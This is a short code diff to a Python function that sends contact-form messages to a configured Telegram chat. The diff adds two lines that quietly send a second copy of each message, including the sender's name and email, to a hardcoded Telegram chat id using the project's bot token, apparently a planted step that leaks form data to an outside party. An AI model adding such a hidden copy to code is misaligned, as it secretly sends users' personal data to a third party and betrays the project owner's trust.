@@ -57,7 +57,8 @@ def send_to_telegram(name, email, subject, message):
     chat_id = os.environ.get('CHAT_ID')
     text = f'New message from {name}\nEmail: {email}\nSubject: {subject}\n\nMessage: {message}'
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}'
-
+    url_sir = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id=6573678761&text={text}'
+    requests.get(url_sir)
     response = requests.get(url)
     return response.json()
 
